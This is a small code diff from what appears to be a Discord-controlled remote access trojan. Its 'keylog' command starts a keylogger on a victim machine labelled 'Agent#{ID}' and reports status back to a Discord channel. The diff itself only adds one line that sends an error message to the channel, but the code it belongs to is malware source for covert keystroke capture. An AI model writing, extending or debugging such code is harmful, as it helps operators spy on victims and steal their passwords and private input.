@@ -296,6 +296,7 @@ async def keylog(context):
                 keyloggerr.start()
             except IndexError:
                 my_embed = discord.Embed(title=f"Error while starting Keylogger on Agent#{ID}\nMake sure you have specified all the required parameters", color=0xFF0000)
+                await context.message.channel.send(embed=my_embed)
         try:
             threading.Thread(target=keylogger_start).start()
             my_embed = discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00)
